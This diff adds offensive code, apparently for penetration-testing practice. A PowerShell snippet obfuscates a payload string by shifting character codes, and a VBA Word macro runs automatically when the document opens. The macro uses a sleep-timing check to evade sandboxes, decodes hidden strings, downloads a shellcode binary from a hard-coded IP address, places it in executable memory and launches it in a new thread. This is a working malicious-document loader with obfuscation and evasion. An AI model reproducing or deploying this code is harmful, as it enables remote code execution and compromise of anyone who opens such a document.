@@ -1,0 +1,106 @@
+[string]$output = ""
+ 
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 17
+    if($thischar.Length -eq 1)
+    {
+        $thischar = [string]"00" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 2)
+    {
+        $thischar = [string]"0" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 3)
+    {
+        $output += $thischar
+    }
+}
+$output | clip
+
+
+
+
+
+
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+ 
+Sub MyMacro()
+    Dim t1 As Date
+    Dim t2 As Date
+    Dim time As Long
+    Dim Apples As String
+    Dim Water As String
+    Dim strUrl As String
+ 
+    t1 = Now()
+    Sleep (2000)
+    t2 = Now()
+    time = DateDiff("s", t1, t2)
+ 
+    If time < 2 Then
+        Exit Sub
+    End If
+    
+    Dim hReq As Object
+ 
+    strUrl = Nuts("121133133129075064064066074067063066071073063069074063066066073064132121118125125062137073071063115122127")
+    Set hReq = CreateObject(Nuts("094100105094093067063105094093089101101097"))
+    Dim buf As Variant
+    With hReq
+        .Open "GET", strUrl, False
+        .send
+        If .Status = 200 Then
+            'Debug.Print (VarType(.responseBody))
+            buf = .responseBody
+        Else
+            buf = Nothing
+        End If
+    End With
+    
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As Long
+ 
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Sub
+ 
+Function Pears(Beets)
+    Pears = Chr(Beets - 17)
+End Function
+ 
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+ 
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+ 
+Function Nuts(Milk)
+    Do
+        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+        Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+ 
+Sub Document_Open()
+    MyMacro
+End Sub
+ 
+Sub AutoOpen()
+    MyMacro
+End Sub
